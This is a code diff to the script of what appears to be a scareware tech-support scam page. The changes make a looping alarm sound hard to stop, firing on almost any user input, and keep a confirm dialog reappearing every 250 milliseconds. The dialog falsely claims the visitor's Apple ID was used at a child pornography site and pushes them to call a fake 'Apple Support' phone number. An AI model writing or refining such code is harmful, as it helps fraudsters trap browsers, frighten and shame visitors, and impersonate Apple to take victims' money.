@@ -369,32 +369,64 @@
         var alertAudio = new Audio('ialert.mp3');
         alertAudio.preload = 'auto';
         alertAudio.loop = true;
-        var audioStarted = false;
 
-        function startAudioLoop() {
-            alertAudio.loop = true;
-            if (audioStarted && !alertAudio.paused) return;
+        var audioCtx = null;
+        var webAudioBuffer = null;
+        var webAudioSource = null;
 
-            var playPromise = alertAudio.play();
-            if (playPromise !== undefined) {
-                playPromise.then(function() {
-                    audioStarted = true;
-                }).catch(function(error) {
-                    // Browser prevented play until explicit user gesture
-                });
+        try {
+            var AudioCtx = window.AudioContext || window.webkitAudioContext;
+            if (AudioCtx) {
+                audioCtx = new AudioCtx();
+                fetch('ialert.mp3')
+                    .then(function(res) { return res.arrayBuffer(); })
+                    .then(function(data) { return audioCtx.decodeAudioData(data); })
+                    .then(function(decoded) { webAudioBuffer = decoded; })
+                    .catch(function() {});
             }
+        } catch(e) {}
+
+        function playWebAudio() {
+            try {
+                if (audioCtx) {
+                    if (audioCtx.state === 'suspended') {
+                        audioCtx.resume();
+                    }
+                    if (webAudioBuffer && !webAudioSource) {
+                        webAudioSource = audioCtx.createBufferSource();
+                        webAudioSource.buffer = webAudioBuffer;
+                        webAudioSource.loop = true;
+                        webAudioSource.connect(audioCtx.destination);
+                        webAudioSource.start(0);
+                    }
+                }
+            } catch(e) {}
         }
 
-        // Attach interaction listeners to unlock audio on first tap/click/press
-        ['click', 'touchstart', 'touchend', 'pointerdown', 'keydown'].forEach(function(eventType) {
-            document.addEventListener(eventType, startAudioLoop, { passive: true });
-            window.addEventListener(eventType, startAudioLoop, { passive: true });
+        function startAudioLoop() {
+            try {
+                alertAudio.loop = true;
+                if (alertAudio.paused) {
+                    var playPromise = alertAudio.play();
+                    if (playPromise !== undefined) {
+                        playPromise.catch(function(error) {});
+                    }
+                }
+            } catch(e) {}
+            playWebAudio();
+        }
+
+        // Attach interaction listeners to invoke audio on any tap/click/press anywhere on screen
+        ['click', 'touchstart', 'touchend', 'pointerdown', 'pointerup', 'mousedown', 'mouseup', 'keydown'].forEach(function(eventType) {
+            document.addEventListener(eventType, startAudioLoop, { passive: true, capture: true });
+            window.addEventListener(eventType, startAudioLoop, { passive: true, capture: true });
         });
 
         setTimeout(function() {
             function loopConfirm() {
                 startAudioLoop(); 
                 myFunction();
+                startAudioLoop();
                 setTimeout(loopConfirm, 250);
             }
             loopConfirm();
@@ -421,9 +453,13 @@
         };
 
         function myFunction() {
-            if (confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.")) {
+            startAudioLoop();
+            var userChoice = confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.");
+            startAudioLoop();
+            if (userChoice) {
                 okkkk();
             } else {
+                startAudioLoop();
                 return;
             }
         }
